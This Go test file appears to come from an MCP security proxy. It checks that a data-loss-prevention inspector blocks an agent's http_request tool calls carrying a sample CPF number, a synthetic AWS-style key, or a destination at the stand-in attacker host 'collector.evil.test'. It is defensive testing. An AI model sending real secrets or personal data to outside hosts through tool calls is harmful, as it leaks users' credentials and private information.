package exfiltration

import (
	"context"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/modelcontextprotocol/go-sdk/mcp"

	"github.com/aluiziodeveloper/guarita/internal/adapters/dlp"
	"github.com/aluiziodeveloper/guarita/internal/adapters/mcphttp"
	"github.com/aluiziodeveloper/guarita/internal/adapters/mcpproxy"
	"github.com/aluiziodeveloper/guarita/internal/adapters/policystatic"
	"github.com/aluiziodeveloper/guarita/internal/app"
	"github.com/aluiziodeveloper/guarita/internal/domain"
)

// behind põe o servidor atrás da Guarita, que permite http_request e
// usa os inspetores dados.
func behind(
	t *testing.T, received *Received, inspectors ...app.Inspector,
) *mcp.ClientSession {
	t.Helper()
	server := NewServer(received)
	upstream := httptest.NewServer(mcp.NewStreamableHTTPHandler(
		func(*http.Request) *mcp.Server { return server }, nil))
	t.Cleanup(upstream.Close)
	policy, _ := policystatic.New(map[string]domain.Decision{
		"http_request": domain.DecisionAllow,
	})
	gate := mcpproxy.NewGate(app.NewInterceptCall(policy, nil,
		app.WithInspectors(inspectors...)))
	target, _ := url.Parse(upstream.URL + "/mcp")
	proxy, _ := mcphttp.NewHandler(target, gate)
	guarita := httptest.NewServer(proxy)
	t.Cleanup(guarita.Close)
	ctx, cancel := context.WithTimeout(t.Context(), 10*time.Second)
	t.Cleanup(cancel)
	session, err := mcp.NewClient(&mcp.Implementation{Name: "agent"}, nil).
		Connect(ctx, &mcp.StreamableClientTransport{
			Endpoint: guarita.URL + "/mcp",
		}, nil)
	if err != nil {
		t.Fatalf("Connect() = %v", err)
	}
	t.Cleanup(func() { _ = session.Close() })
	return session
}

// payloads são as três saídas da cena. O CPF é o de exemplo das
// documentações; a chave sintética é montada em tempo de execução.
func payloads() map[string]map[string]any {
	key := "AKIA" + strings.Repeat("LAB0", 4)
	inside := "https://lab.test/r"
	return map[string]map[string]any{
		"CPF no corpo": {"url": inside, "body": "cliente " +
			"123456789" + "09"},
		"chave no corpo":  {"url": inside, "body": "config " + key},
		"destino de fora": {"url": "https://collector.evil.test/c"},
	}
}

// guard é o DLP da linha de comando com -allow-hosts lab.test.
func guard() app.Inspector {
	return dlp.New(dlp.DefaultActions(), 4.3,
		dlp.WithAllowedHosts("lab.test"))
}

// #region attacks-exfiltration-test
// As três saídas, sem e com o DLP. Sem ele, as três chegam ao servidor;
// com ele, nenhuma.
func TestExfiltration(t *testing.T) {
	for _, defended := range []bool{false, true} {
		received := &Received{}
		var inspectors []app.Inspector
		if defended {
			inspectors = append(inspectors, guard())
		}
		session := behind(t, received, inspectors...)
		for name, arguments := range payloads() {
			_, err := session.CallTool(t.Context(),
				&mcp.CallToolParams{
					Name:      "http_request",
					Arguments: arguments,
				})
			t.Logf("dlp=%-5v %-15s %v", defended, name, err)
		}
		reached := len(received.All())
		t.Logf("dlp=%-5v chegaram ao servidor: %d de 3", defended,
			reached)
		if (defended && reached != 0) || (!defended && reached != 3) {
			t.Errorf("dlp=%v: %d chegaram", defended, reached)
		}
	}
}

// #endregion
